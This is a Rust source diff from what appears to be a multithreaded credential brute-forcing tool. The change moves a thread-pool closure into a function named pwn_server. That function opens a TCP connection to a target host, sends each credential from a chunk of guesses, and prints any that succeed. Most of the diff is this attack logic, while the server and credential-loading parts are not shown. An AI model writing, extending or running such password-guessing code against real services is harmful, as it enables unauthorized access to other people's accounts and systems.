@@ -133,32 +133,7 @@ fn main() -> Result<()> {
         let host = host.clone();
         let sender = sender.clone();
         let manage_threads = manage_threads.clone();
-        pool.execute(move || {
-            let server = Server{host:&host};
-            // let cred_chunk = cred_chunk.clone();
-            let mut stream = server.connect_tcp();
-            if server.can_connect(&mut stream) {
-                for cred in &cred_chunk.clone() {
-                    match server.send(cred, &mut stream, &sender) {
-                        Ok(code) => { 
-                            if code == 1 {
-                                println!("------------- SUCCESS -------------");
-                                println!("{}", cred);
-                                println!("------------- SUCCESS -------------");
-                                manage_threads.finish_work();
-                            }
-                        }
-                        Err(err) => {
-                            println!("{:}", err)
-                        }
-                    }
-                }
-            } else {
-                println!(
-                    "It appears that is not ready for new connections"
-                );
-            }
-        })
+        pool.execute(move || pwn_server(&manage_threads,host,sender,cred_chunk));
     }
     manage_threads.start_work();
     println!("Total attempts {}", receiver.try_iter().count());
@@ -277,3 +252,28 @@ impl ManageThreads for HandleThreads {
     }
 }
 
+fn pwn_server(manage_threads:&HandleThreads,host: String,sender: Sender<u32>,cred_chunk: Vec<String>) -> () {
+    let server = Server{host:&host};
+    let mut stream = server.connect_tcp();
+    if server.can_connect(&mut stream) {
+        for cred in &cred_chunk.clone() {
+            match server.send(cred, &mut stream, &sender) {
+                Ok(code) => { 
+                    if code == 1 {
+                        println!("------------- SUCCESS -------------");
+                        println!("{}", cred);
+                        println!("------------- SUCCESS -------------");
+                        manage_threads.finish_work();
+                    }
+                }
+                Err(err) => {
+                    println!("{:}", err)
+                }
+            }
+        }
+    } else {
+        println!(
+            "It appears that is not ready for new connections"
+        );
+    }
+} 
